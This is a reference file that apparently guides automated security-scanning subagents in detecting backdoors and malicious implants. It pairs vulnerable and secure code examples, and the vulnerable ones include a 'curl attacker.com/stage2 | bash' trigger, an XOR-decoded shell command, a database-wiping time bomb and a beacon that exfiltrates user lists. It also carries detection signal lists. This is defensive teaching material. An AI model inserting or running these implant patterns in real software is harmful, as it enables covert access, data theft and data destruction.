---
subject: "Backdoor and malicious-implant detection reference for SAST subagents; shared-protocol execution parameters, IS/IS-NOT definition with prevention patterns, vulnerable/secure examples per technique, ten-row taxonomy incl. supply-chain implants, per-category heuristics, `API8:2023`/`API10:2023` mapping, CWE list incl. `CWE-511`, operational reminders, references incl. XZ `CVE-2024-3094`, tj-actions."
index:
  - anchor: backdoors-detection
    what: "Focused deliberate-malicious-code detection role executed through the shared three-stage pipeline (`execution-protocol.md`) — recon for suspicious construction sites across eleven categories, batched verify separating genuine implants from legitimate patterns, merge — gated on the architecture report."
    problem: "Codebase may hide intentionally planted adversarial code rather than accidental flaws, and unstructured hunting conflates legitimate dynamic loading with covert implants while burying reviewers in unverified candidates; detection orchestration, implant sweep, intent judgment, candidate flood, coverage goal, methodical triage, covert capability."
    use_when: "Backdoor scan selected by the screener; `{{ REPORTS_ROOT }}/01_architecture.md` exists; full three-stage detection must run."
    avoid_when: "Architecture report missing — run analysis first; only conceptual implant knowledge is needed, not execution."
    expected: "Confirmed backdoor findings consolidated into one module report with legitimate patterns filtered out."
  - anchor: backdoors-what-is
    what: "Backdoor definition — code intentionally inserted to serve attacker rather than application — with IS list (hidden routes, dynamic loading, runtime decryption, triggers, anti-analysis, DGA, exfiltration), IS-NOT list (feature flags, signed plugins, KMS decryption, defensive checks, test hooks, scheduled jobs), and three prevention patterns incl. allowlisted loading, KMS-backed secrets, multi-person review with reproducible builds."
    problem: "Reviewer cannot tell whether suspicious construct counts as deliberately planted implant without crisp intent boundaries, so authenticated admin features get flagged while dead code reachable only through reflection slips past triage; definition scope, boundary rules, inclusion criteria, exclusion list, classification accuracy, intent framing, false-flag risk, adversary-versus-product test."
    use_when: "Deciding whether observed construct belongs to the implant risk class; testing IS criteria against code behavior; confirming whether flagged pattern matches documented legitimate mechanisms."
    avoid_when: "Plain code-injection sinks are the question — route to `05-rce.md`; dependency-tree version and CVE risk belongs to `23-dependencies.md`; packing or obfuscation analysis without intent judgment belongs to `22-obfuscation.md`; config hardening gaps belong to `20-misconfiguration.md`."
    expected: "Suspicious constructs classified against IS/IS-NOT boundaries with explicit intent reasoning; legitimate mechanisms dismissed with documented rationale."
  - anchor: backdoors-vulnerable-vs-secure-examples
    what: "Six vulnerable/secure code pairs — dynamic loading from `X-Module` header versus fixed allowlist, reflective invocation versus enum dispatch, runtime hex-decrypted command versus signed config, CI-marker environment trigger versus explicit deploy gating, date-based time bomb versus audited maintenance windows, C2 beaconing versus schema-bound telemetry — across Python, Java, and JavaScript."
    problem: "Implants look different per technique, and generic suspicion rules miss whether constructed module paths, reflected method names, decoded blobs, or gated triggers actually decide malicious intent; technique recipes, hardened idioms, precise detection, pattern matching, stack quirks, payload signals, verdict support, exploit shape."
    use_when: "Verify stage applies the file's per-stack examples when judging candidates; target project uses one of the covered languages; contrasting observed construct against known-good counterpart."
    avoid_when: "Conceptual IS/IS-NOT boundaries are the question — see the definition card; category catalog needed — see the taxonomy card; plain injection-sink semantics belong to `05-rce.md`."
    expected: "Each suspicious site matched against its vulnerable pattern and secure counterpart; matching idioms cited in batch findings."
  - anchor: backdoors-taxonomy
    what: "Ten-row category table — dynamic loading, reflective invocation, runtime string decryption, environment triggers, time bombs, dead-code activation, anti-debug/anti-analysis, DGA patterns, beaconing/C2, supply-chain implants — each with description and typical signals incl. `importlib.import_module(var)`, `Assembly.Load(byte[])`, `IsDebuggerPresent`, `postinstall` hooks, XZ `CVE-2024-3094` build injection."
    problem: "Recon output and findings need consistent category labels, yet improvised naming fragments reports and leaves supply-chain insertion channels without any bucket; category canon, labeling scheme, signal index, classification vocabulary, report consistency, bucket coverage, naming discipline."
    use_when: "Assigning canonical labels to recon sites or batch findings; checking which signals typify each implant class; scoping recon search lists across all ten rows."
    avoid_when: "Per-category hunt procedure is the need — see the heuristics card; conceptual intent boundaries belong to the definition card."
    expected: "Every site and finding carries one canonical row label; no implant class left unnamed."
  - anchor: backdoors-detection-heuristics
    what: "Per-category hunt checklist: dynamic-loading constant checks, reflection with user-controlled names, large base64/hex literals feeding `eval`/`exec`, debugger/VM artifact branching, hardcoded date comparisons, uncalled functions reachable via string dispatch, anti-debug APIs on macOS, DGA entropy traits, periodic outbound loops, and supply-chain channels incl. CI action pin verification, maintainer-change review, build-artifact diffing."
    problem: "Verifier knows implant categories yet lacks concrete per-category tells, so subtle signals like `TracerPID` reads, movable CI tags, or network-sourced loaded bytes go unchecked during review; hunting rigor, signal checklist, review depth, per-class scrutiny, evidence pointers, inspection steps, overlooked markers, false-negative exposure."
    use_when: "Recon or verify subagent needs actionable search guidance for one implant class; reviewing build hooks, CI pins, or provenance for supply-chain signals; deciding which artifacts to inspect for time bombs, DGA, or beaconing."
    avoid_when: "Category catalog without procedure is the need — see the taxonomy card; pure packing or obfuscation analysis belongs to `22-obfuscation.md`; dependency-tree CVE risk belongs to `23-dependencies.md`."
    expected: "Every category checked with its concrete tells; each signal class inspected before verdict."
  - anchor: backdoors-execution
    what: "Domain execution parameters for the shared three-stage protocol: recon catalog of suspicious construction sites across eleven categories incl. supply-chain and agent-tooling channels, four-question intent verify checklist, backdoor-family classification rubric, and the finding-field set with OWASP API 2023 root-cause risk (`API8:2023`/`API10:2023`) and CWE fields."
    problem: "Backdoor hunting without precise domain criteria lets recon conflate legitimate dynamic loading with covert implants and verify apply generic checklists that skip intent judgment; criteria ownership, domain parameters, search catalog, checklist precision, detection quality, class specifics."
    use_when: "Dispatching or executing any pipeline stage for this scan; reviewing whether recon and verify criteria cover current implant vectors."
    avoid_when: "Stage mechanics — batching, gating, merging — belong to `execution-protocol.md`; conceptual intent boundaries belong to the definition card."
    expected: "Stage subagents apply exact backdoor criteria without inheriting generic templates."
  - anchor: backdoors-owasp-mapping
    what: "Two-row OWASP root-cause mapping: `API8:2023` Security Misconfiguration for hidden endpoints, unauthorized dynamic loading, and weak build-pipeline controls; `API10:2023` Unsafe Consumption of APIs for third-party abuse, external C2 beaconing, and reflective loading of untrusted code."
    problem: "Findings must carry root-cause risk labels, yet reviewers guess between misconfiguration and unsafe-consumption framings or skip mapping entirely, weakening report credibility; taxonomy tagging, risk attribution, mapping choice, report compliance, framing consistency, required field, dual applicability."
    use_when: "Filling the `OWASP API 2023 root-cause risk` field on batch findings; deciding whether one or both risks apply to confirmed implants."
    avoid_when: "CWE identifier selection is the need — see the CWE card; broad misconfiguration hardening without implant context belongs to `20-misconfiguration.md`; third-party trust analysis belongs to `19-unsafeapiconsumption.md`."
    expected: "Each finding cites `API8:2023`, `API10:2023`, or both with one-line justification."
  - anchor: backdoors-cwe-references
    what: "CWE identifier list for implant findings: `CWE-912` Hidden Functionality as parent weakness for most scan output, `CWE-78` OS Command Injection, `CWE-94` Code Injection, `CWE-506` Embedded Malicious Code, `CWE-507` Trojan Horse, `CWE-511` Logic/Time Bomb, `CWE-510` Trapdoor, `CWE-509` Replicating Malicious Code."
    problem: "Findings require precise weakness identifiers, and vague or missing mappings strip reports of remediation routing and trend tracking across scans; weakness taxonomy, mapping precision, report metadata, identifier canon, trend analysis, citation discipline, scan comparability."
    use_when: "Selecting the most specific CWE for each batch finding; confirming `CWE-912` as default parent when no narrower entry fits."
    avoid_when: "OWASP risk framing is the need — see the mapping card; external attack-technique context wanted — see the references card."
    expected: "Every finding maps to the narrowest applicable CWE with `CWE-912` parentage noted."
  - anchor: backdoors-important-reminders
    what: "Closing operational reminders: judgment-based `Confirmed Backdoor` reservation, git-history insertion checks via `git log -p --follow` and `git blame`, dependency-provenance and typosquatting verification, read-only verification discipline, evidence preservation before remediation, incident handling with credential rotation, read-only subagent constraint."
    problem: "Modules close with inconsistent final guidance, letting premature confirmed verdicts, executed payloads, or unpreserved evidence slip into reports and incident response; closing rules, quality floor, final reminders, uniform endings, wrap discipline, audit closure, judgment restraint."
    use_when: "Finalizing the module report; checking verdict confidence, evidence handling, and cleanup obligations before closing the scan."
    avoid_when: "Earlier phases are still open — finish those first; injection, obfuscation, dependency, or config routing belongs to `05-rce.md`, `22-obfuscation.md`, `23-dependencies.md`, or `20-misconfiguration.md` cards."
    expected: "Reports close with uniform final rules applied, evidence preserved, and no malicious code executed."
  - anchor: backdoors-references
    what: "External link list: MITRE ATT&CK `T1620` reflective code loading, `T1622` debugger evasion, `T1497` virtualization/sandbox evasion, OWASP `API8:2023` and `API10:2023` pages, `CWE-506`/`CWE-507`/`CWE-510`/`CWE-511`/`CWE-912`, XZ Utils `CVE-2024-3094` supply-chain implant, tj-actions `GHSA-mrrh-fwg8-r2c3` compromise."
    problem: "Reports need authoritative follow-up sources beyond distilled file content when attack-technique detail, supply-chain incident narratives, or canonical citation is required; further reading, external canon, deep dives, primary material, cited works, incident case studies, reference integrity."
    use_when: "Primary sources or extended material is needed; findings require links to ATT&CK techniques, CWE entries, or documented supply-chain incidents."
    avoid_when: "Recipe or orchestration needs route elsewhere — this list is follow-up reading, not procedure."
    expected: "Reader reaches canonical external material for any topic this file condenses."
---

# Deliberate Malicious Code / Backdoor Detection

[ref: #backdoors-detection]

You are performing a focused security assessment to find **deliberately planted malicious code** in a codebase. Unlike accidental vulnerabilities, backdoors and implants are intentionally inserted by an adversary (external attacker, compromised maintainer, or insider) to provide covert access, exfiltrate data, or trigger destructive behavior. This skill uses a three-stage pipeline with subagents: **recon** (find suspicious construction sites), **batched verify** (determine whether each site is a genuine backdoor or a legitimate pattern, in parallel batches of 3), and **merge** (consolidate results).

**Prerequisites**: `{{ REPORTS_ROOT }}/01_architecture.md` must exist. Run the analysis skill first if it doesn't.

## What is deliberate malicious code
[ref: #backdoors-what-is]

A backdoor or malicious implant is code intentionally inserted into a project to bypass normal authentication, execute hidden commands, exfiltrate data, establish persistence, or damage systems when a trigger is met. It is not a coding mistake; it is an adversarial capability embedded inside the software supply chain or application source.

The core question: *does this code exist to serve the application, or does it exist to serve an attacker?*

### What a backdoor IS

- A hidden route, endpoint, or condition that grants access or executes a payload without normal authorization.
- Dynamic loading or reflective invocation of code that is not part of the declared dependency graph.
- Runtime decryption or deobfuscation of strings that reveal URLs, commands, keys, or C2 domains.
- Environment-, time-, or event-based triggers that activate dormant malicious logic.
- Anti-debug, anti-VM, or anti-sandbox checks whose only purpose is to evade analysis.
- Domain-generation algorithms (DGAs) or hardcoded C2 infrastructure used for beaconing.
- Code that exfiltrates data, mines cryptocurrency, logs credentials, or wipes data outside the application's intended behavior.

### What a backdoor is NOT

Do not flag these as backdoors:

- **Legitimate feature flags** or admin endpoints protected by strong authentication and audit logging.
- **Dynamic plugin systems** that load vetted, signed modules from a known allowlist.
- **Encrypted configuration** that decrypts at startup using keys from a KMS, HSM, or secure enclave.
- **Defensive checks** such as rootkit detection, anti-tamper, or license enforcement — these may resemble anti-debug but have legitimate business purpose.
- **Test stubs, debug hooks, or easter eggs** in internal tooling, provided they are documented and cannot be reached in production.
- **Legitimate scheduled jobs** (backups, reports, cleanup) that have no covert behavior.

### Patterns that prevent backdoors

When you see these patterns, the code is likely **not a backdoor**:

**1. Signed / verified dynamic loading**
```python
# Only load modules whose signature matches a pinned allowlist
if module_signature not in ALLOWLIST:
    raise ImportError("Untrusted module")
importlib.import_module(module_name)
```

**2. KMS-backed secret decryption**
```python
# Secret is fetched from a KMS, not decrypted by a hardcoded key
secret = kms_client.decrypt(ciphertext_blob=encrypted_secret)["Plaintext"]
```

**3. Mandatory multi-person code review and reproducible builds**
- All changes require at least two reviewers.
- Build pipelines produce signed, reproducible artifacts.
- Dependencies are pinned and checksum-verified.

***

## Vulnerable vs. Secure Examples
[ref: #backdoors-vulnerable-vs-secure-examples]

### Dynamic loading with a constructed path

```python
# VULNERABLE: dynamically constructs module name from an HTTP header
module_name = request.headers.get("X-Module")
mod = importlib.import_module(module_name)
mod.run(request.json)
# Payload: X-Module: os → attacker can import arbitrary modules

# SECURE: load only from a fixed allowlist
ALLOWED_MODULES = {"reports", "exports", "search"}
module_name = request.headers.get("X-Module")
if module_name not in ALLOWED_MODULES:
    raise ValueError("Invalid module")
mod = importlib.import_module(f"app.plugins.{module_name}")
```

### Reflective invocation of private methods

```java
// VULNERABLE: reflects a user-supplied method name into any object
String method = request.getParameter("action");
Method m = UserService.class.getDeclaredMethod(method, String.class);
m.setAccessible(true);
m.invoke(userService, request.getParameter("arg"));

// SECURE: dispatch through a fixed switch/enum with no reflection
public enum UserAction { RESET_PASSWORD, DISABLE_ACCOUNT }
UserAction action = UserAction.valueOf(request.getParameter("action"));
switch (action) { ... }
```

### Runtime string decryption

```javascript
// VULNERABLE: hex-encoded command decrypted at runtime
function run() {
  const key = 0x42;
  const blob = "1b6c..."; // hex-encoded shell command
  const cmd = Buffer.from(blob, "hex").map(b => b ^ key).toString();
  require("child_process").exec(cmd);
}

// SECURE: no hidden commands; commands are explicit and reviewed
function run() {
  const cmd = config.get("verified.command");
  // cmd is a static allowlisted string loaded from signed config
  spawn(cmd, args);
}
```

### Environment trigger

```python
# VULNERABLE: only executes payload when running outside a known CI image
import os
if not os.path.exists("/opt/ci-marker"):
    os.system("curl attacker.com/stage2 | bash")

# SECURE: behavior does not depend on attacker-controllable environment markers
if os.environ.get("DEPLOY_ENV") in {"prod", "staging"}:
    initialize_telemetry()
```

### Time bomb

```python
# VULNERABLE: payload activates on a specific date
from datetime import datetime
if datetime.now() > datetime(2027, 1, 1):
    wipe_database()

# SECURE: explicit, auditable scheduled maintenance windows
from app.maintenance import is_scheduled_window
if is_scheduled_window("db-cleanup"):
    run_cleanup_with_approval()
```

### Beaconing / C2 callback

```python
# VULNERABLE: periodic callback to an attacker-controlled domain
import requests, time
while True:
    time.sleep(300)
    requests.post("https://update-service-2026.example.com/heartbeat",
                  json={"hostname": os.uname().nodename,
                        "users": get_all_users()})

# SECURE: telemetry to an owned, well-known endpoint with explicit schema
from app.telemetry import send_telemetry
send_telemetry(endpoint=config.TELEMETRY_URL, schema=TELEMETRY_SCHEMA)
```

***

## Backdoor / Implant Taxonomy
[ref: #backdoors-taxonomy]

| Category | Description | Typical signals |
| --- | --- | --- |
| **Dynamic loading** | Loads code from a runtime-constructed path, downloaded bytes, or anonymous memory instead of normal imports. | `dlopen`, `LoadLibrary`, `importlib.import_module(var)`, `Assembly.Load(byte[])`, `require(pathVar)`, memory-backed modules. |
| **Reflective invocation** | Uses reflection to call methods, access private fields, or instantiate classes outside the normal call graph. | `java.lang.reflect`, `System.Reflection`, `getattr/setattr` on arbitrary names, `Method.invoke` with user input. |
| **Runtime string decryption** | Hardcoded base64/hex blobs, XOR/AES loops, or custom substitution that decode commands, URLs, or keys at runtime. | Functions named `decrypt`, `decode`, `unpack` operating on large literal strings; repeated `atob`/`Buffer.from` on constants. |
| **Environment triggers** | Code that checks for analysis artifacts, specific hostnames, env vars, or missing files before running the payload. | Checks for `/proc/self/status` TracerPID, `LD_PRELOAD`, debugger tool names, VM artifacts, or `CI`/`DEBUG` variables to branch. |
| **Time bombs** | Logic that activates on a fixed date, after an uptime threshold, or after N invocations. | Comparisons against hardcoded dates, `time.time()` deltas, `Date.now()` thresholds, or decrementing counters in long-running loops. |
| **Dead-code activation** | Large, unused-looking functions or "junk" classes that are invoked only through obscure branches, callbacks, or reflection. | Functions with no normal callers but reachable via reflection, eval, or event handlers; heavy obfuscation around a small entry point. |
| **Anti-debug / anti-analysis** | Checks that serve no product purpose and exist only to detect debuggers, sandboxes, or virtual machines. | `IsDebuggerPresent`, `NtQueryInformationProcess`, `/proc/self/status` TracerPID, `ptrace(PTRACE_TRACEME)`, timing checks, VM MAC addresses. |
| **DGA patterns** | Algorithmic generation of candidate C2 domains from a seed such as the current date. | Loops building random-looking domain strings, concatenating consonants/vowels, or hashing a timestamp to produce domains. |
| **Beaconing / C2** | Periodic outbound requests that exfiltrate data or poll for commands. | `setInterval`/`setTimeout` loops issuing HTTP requests, cron jobs calling external URLs, long-polling to dynamic DNS domains. |
| **Supply-chain implants** | Malicious code shipped through build hooks, CI actions, dependency releases, or compromised maintainer accounts rather than direct source edits. | `postinstall`/build-script hooks, retroactively moved version tags, test-artifact-driven build injection (XZ CVE-2024-3094), sudden maintainer changes. |

***

## Detection heuristics per category
[ref: #backdoors-detection-heuristics]

### Dynamic loading

- Look for runtime module loading where the argument is not a compile-time constant: `importlib.import_module(var)`, `LoadLibrary(pathVar)`, `dlopen(buf)`, `Assembly.Load(rawBytes)`.
- Check whether the loaded bytes come from the network, a file upload, or an encrypted blob.
- Verify whether the project uses a signed/allowlisted plugin system; if not, dynamic loading of arbitrary code is high-signal.

### Reflective invocation

- Search for reflection APIs invoked with user-controlled strings: `getDeclaredMethod(name)`, `getattr(obj, name)`, `System.Reflection.Assembly.Load`.
- Flag `setAccessible(true)` or equivalent used to reach private members without a clear legitimate purpose.
- Check whether the reflected names are hardcoded constants (lower risk) or derived from request data (high risk).

### Runtime string decryption

- Identify large base64/hex literals assigned to variables named `payload`, `shell`, `cmd`, `url`, `key`, `secret`.
- Look for loops that XOR, rotate, or AES-decrypt constants before use.
- Trace decrypted values: do they become URLs, shell commands, `eval`/`exec` arguments, or network destinations?

### Environment triggers

- Search for checks of debugger/sandbox/VM artifacts: `IsDebuggerPresent`, `NtQueryInformationProcess`, `/proc/self/status`, `ptrace`, `TracerPID`, `vmware`, `vbox`, `xen`, `sandboxie`.
- Look for branching that performs benign work when the artifact is present and malicious work when it is absent (or vice versa).
- Check for `CI`, `GITHUB_ACTIONS`, `DEBUG` environment variable checks that gate destructive behavior.

### Time bombs

- Search for hardcoded dates, timestamps, or counters used in conditional logic.
- Look for `sleep`/`setTimeout`/`setInterval` combined with destructive operations (file deletion, DB wipes, outbound requests).
- Pay special attention to date comparisons in deployment scripts, cron jobs, or initialization code.

### Dead-code activation

- Find functions or classes that have no static call sites but are referenced by string name in reflection, eval, or event maps.
- Look for unusually large functions hidden inside otherwise small utility files, especially when obfuscated.
- Check `package.json` `postinstall`, `setup.py`, `Makefile`, and CI scripts for hidden activation hooks.

### Anti-debug / anti-analysis

- Treat anti-debug checks as suspicious unless they are part of a documented anti-piracy, anti-tamper, or security product feature.
- Look for exception-based timing checks, `OutputDebugString` flooding, or attempts to hide from `/proc`.
- On macOS, flag `sysctl` checks for `P_TRACED` or `ptrace(PTRACE_DENY_ATTACH)` in non-security software.

### DGA patterns

- Search for loops that concatenate random characters or dictionary words into domain names.
- Look for seeding from `datetime.now()`, `time()`, or hardcoded constants followed by DNS resolution.
- Compare generated strings to known DGA traits: high entropy, nonsensical syllables, mixed TLDs, NXDOMAIN bursts.

### Beaconing / C2

- Find periodic outbound HTTP requests in loops, timers, or cron jobs.
- Check whether the destination is an IP address, dynamic DNS domain, or recently registered domain.
- Look for exfiltration of hostnames, user lists, environment variables, or file listings in request bodies.

### Supply-chain insertion channels

- Check build/install hooks (`package.json` scripts, `setup.py`, Makefile, CI workflow steps) for network calls or encoded payloads.
- Verify CI action pins: full-length commit SHA versus movable tags (tj-actions compromise, GHSA-mrrh-fwg8-r2c3).
- Review recent maintainer/ownership changes and release provenance for critical dependencies (XZ-style trust-building, CVE-2024-3094).
- Diff build artifacts against source: test files influencing the build, IFUNC/linker hooks, or build-time code injection.

***

## Execution
[ref: #backdoors-execution]

This scan runs via the shared three-stage pipeline in `references/execution-protocol.md` (recon+split → per-batch verify → merge, core-dispatched). The domain parameters below plug into its stage contracts. Final artifact: `{{ REPORTS_ROOT }}/21_backdoors.md`; classification family: **backdoor** (`[CONFIRMED BACKDOOR]` / `[LIKELY BACKDOOR]`).

### Recon catalog

Search for these suspicious construction sites:

1. **Dynamic loading**:
   - Python: `importlib.import_module(var)`, `__import__(var)`, `imp.load_source`, `ctypes.CDLL` with variable paths.
   - Node.js: `require(pathVar)`, `import(pathVar)`, `vm.runInNewContext`, `eval` of module code.
   - Java: `Class.forName(var)`, `Method.invoke` with dynamic names, `URLClassLoader` with constructed URLs.
   - C#: `Assembly.Load(byte[])`, `Activator.CreateInstance` with dynamic types, reflection on user input.
   - Go: `plugin.Open` with variable paths, `dlopen`/`dlsym` via cgo.
   - Native: `dlopen`, `LoadLibrary`, `dlsym`, `GetProcAddress` with non-constant arguments.

2. **Reflective invocation**:
   - `java.lang.reflect.*`, `System.Reflection.*`, `getattr`/`setattr` with request-derived names, `call_user_func(var)`.

3. **Runtime string decryption**:
   - Large base64/hex literals, XOR/AES/rot loops, custom `decode`/`decrypt`/`unpack` functions whose output reaches `exec`, `eval`, `system`, `subprocess`, `fetch`, or `requests`.

4. **Environment triggers**:
   - Checks for debuggers, VMs, sandboxes, CI flags, or specific files before executing sensitive logic.

5. **Time bombs**:
   - Hardcoded dates/timestamps, countdowns, or invocation counters that gate destructive behavior.

6. **Dead-code activation**:
   - Functions/classes with no normal call sites but reachable via reflection, eval, string dispatch, or build hooks (`postinstall`, `setup.py`, cron, init scripts).

7. **Anti-debug / anti-analysis**:
   - `IsDebuggerPresent`, `NtQueryInformationProcess`, `/proc/self/status` TracerPID, `ptrace`, VM/sandbox artifacts, timing checks.

8. **DGA patterns**:
   - Code that generates many candidate domains from a seed.

9. **Beaconing / C2**:
   - Timers or loops that call external domains/IPs and exfiltrate host or user data.

10. **Supply-chain insertion channels**:
    - Build/install hooks (`package.json` scripts, `setup.py`, Makefile, CI workflow steps) with network calls or encoded payloads.
    - CI actions pinned by tag instead of full-length commit SHA.
    - Recent maintainer/ownership changes on critical dependencies.
    - Test artifacts that influence the build (build-time injection).

11. **Agent tooling as implant channel**:
    - `.mcp.json`, `mcp.json`, agent skill/extension directories, and AI-agent tool configs that invoke external code (shadow MCP servers, OWASP MCP09:2025).

**Recon exclusions** — do not report:

- Static imports and normal dependency usage.
- Documented, authenticated admin features.
- Signed/allowlisted plugin systems.
- KMS-backed secret retrieval.

### Verify checklist

For each candidate, answer these four intent questions:

1. **Is the code required for the application's documented behavior?**
   - Does the feature make sense in the file where it appears?
   - Is it reachable through normal user flows, or only through reflection, hidden headers, or build hooks?
2. **Does the code hide its intent?**
   - Are strings encrypted or encoded?
   - Is the control flow obfuscated?
   - Are there anti-debug or anti-sandbox checks?
3. **Does the code contact external infrastructure?**
   - Is the destination owned by the organization?
   - Is it an IP address, dynamic DNS, or DGA-style domain?
   - Does it exfiltrate data?
4. **Does the code have a destructive or unauthorized trigger?**
   - Time bomb, environment trigger, absence trigger, counter trigger?
   - Can it delete data, execute OS commands, or disable security controls?

### Classification

- **Confirmed Backdoor / Implant**: Code has no legitimate purpose and is designed to provide covert access, exfiltrate data, or trigger malicious behavior.
- **Likely Backdoor / Implant**: Strong adversarial indicators but some uncertainty about intent or reachability.
- **Suspicious but Legitimate**: Unusual pattern but has a plausible product purpose (e.g., documented plugin system, license enforcement, diagnostic feature).
- **Needs Manual Review**: Cannot determine intent from code alone; requires maintainer interview or runtime analysis.

### Finding fields

Every finding block carries: classification tag, file/lines, endpoint or function, issue, impact, evidence (code snippet), taint trace / trigger (how the backdoor is reached and what activates it), remediation, safe read-only verification steps (string decoding, static analysis, domain ownership lookup, git-history review), plus two required extra fields — **OWASP API 2023 root-cause risk** (`API8:2023` Security Misconfiguration and/or `API10:2023` Unsafe Consumption of APIs, with one-line justification) and **CWE** (most specific of CWE-912 / CWE-78 / CWE-94 / CWE-506 / CWE-507 / CWE-510 / CWE-511).

***

## OWASP API Security Top 10 2023 mapping
[ref: #backdoors-owasp-mapping]

| OWASP Risk | Why Backdoors / Malicious Code Matter |
|---|---|
| **API8:2023 Security Misconfiguration** | Hidden endpoints, unauthorized dynamic loading, and weak build-pipeline controls allow implants to persist. |
| **API10:2023 Unsafe Consumption of APIs** | Backdoors may abuse third-party integrations, beacon to external C2, or reflectively load untrusted code. |

***

## CWE references
[ref: #backdoors-cwe-references]

- CWE-912: Hidden Functionality
- CWE-78: OS Command Injection
- CWE-94: Improper Control of Generation of Code ('Code Injection')
- CWE-506: Embedded Malicious Code
- CWE-507: Trojan Horse
- CWE-511: Logic/Time Bomb
- CWE-510: Trapdoor
- CWE-509: Replicating Malicious Code (Virus or Worm)
- CWE-912 is the parent weakness for most findings produced by this scan.

***

## Important Reminders
[ref: #backdoors-important-reminders]

- Backdoor detection is **inherently judgment-based**. A finding of "Confirmed Backdoor" should be reserved for code that clearly has no legitimate purpose and contains adversarial indicators (hidden triggers, obfuscation, C2, exfiltration).
- Always check **git history** for the insertion: `git log -p --follow -- <file>` and `git blame -L <start>,<end> <file>`. A backdoor inserted in a single commit by an unknown author is higher confidence than code that evolved over many reviewed commits.
- Check **dependency provenance**: if the suspicious code is in a third-party package, verify the package author, version history, and whether it is typosquatting or a compromised release.
- Do **not** run destructive or exfiltrating code. Verification must be read-only (string decoding, static analysis, domain lookup, git inspection).
- Preserve evidence before remediation: screenshots, commit hashes, decoded strings, and file hashes.
- If a confirmed backdoor is found, treat it as an **incident**: rotate credentials, audit access, review build pipeline integrity, and notify stakeholders.
- Subagents are read-only: they must not modify project source code, commit changes, or run potentially malicious code.
- Intermediate-file lifecycle is owned by `execution-protocol.md`: the merge stage deletes `21_recon.md`, `21_batch_*.md`, and `21_verify_*.md`; only the final `{{ REPORTS_ROOT }}/21_backdoors.md` persists.

***

## References
[ref: #backdoors-references]

- MITRE ATT&CK T1620 — Reflective Code Loading
- MITRE ATT&CK T1622 — Debugger Evasion
- MITRE ATT&CK T1497 — Virtualization/Sandbox Evasion
- OWASP API Security Top 10 2023 — API8:2023 Security Misconfiguration
- OWASP API Security Top 10 2023 — API10:2023 Unsafe Consumption of APIs
- CWE-912: Hidden Functionality
- CWE-506: Embedded Malicious Code
- CWE-507: Trojan Horse
- CWE-511: Logic/Time Bomb
- CWE-510: Trapdoor
- CVE-2024-3094 — XZ Utils backdoor (supply-chain implant via build injection)
- GHSA-mrrh-fwg8-r2c3 — tj-actions/changed-files supply-chain compromise (2025)
